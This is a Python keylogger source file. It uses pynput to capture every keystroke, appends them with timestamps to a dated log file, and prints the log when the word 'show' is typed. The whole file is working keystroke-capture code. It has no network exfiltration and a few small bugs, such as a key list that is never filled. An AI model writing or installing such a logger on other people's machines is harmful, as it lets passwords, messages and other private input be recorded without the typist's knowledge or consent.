from multiprocessing.connection import Listener
from time import sleep
from pynput import keyboard
from datetime import datetime
import threading

file_name = f"logs/{datetime.now().strftime("%d-%m-%Y")}.txt"
current_time = datetime.now().strftime("%d/%m/%Y %H:%M")

print(current_time)
with open(file_name, "w") as file:
    file.write("\n***** " + current_time + " *****\n")

class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.Listener = None

    def on_press(self,key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            tempKey = key
            if tempKey == keyboard.Key.backspace:
                self.my_list = self.my_list[:-1]
                return
            elif tempKey == keyboard.Key.enter:
                tempKey = '\n'
            elif tempKey == keyboard.Key.space:
                tempKey = " "
        AddToFile.add_to_file(tempKey)

    def start_logging(self):
        self.Listener = keyboard.Listener(on_press= self.on_press)
        self.Listener.start()

    def stop_logging(self):
        self.Listener.stop()

    def get_logged_keys(self):
        return "".join(self.my_list)


class AddToFile():
    def add_to_file(tempKey):
       global current_time
       tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
       if tempTime != current_time:
           with open(file_name, "a") as file:
               file.write("\n***** " + tempTime + " *****\n")
               current_time = tempTime
       with open(file_name, "a") as file:
           file.write(str(tempKey))
       data = ''
       with open(file_name, "r") as f:
           data = f.read()
       if data[-4:] == "show":
           print("\n"+data[:-4:])

    def write_time(self):
        with open(file_name, "a") as file:
            file.write("\n" + datetime.now().strftime("%d/%m/%Y %H:%M:%S") + "\n")

        threading.Timer(5, self.write_time).start()
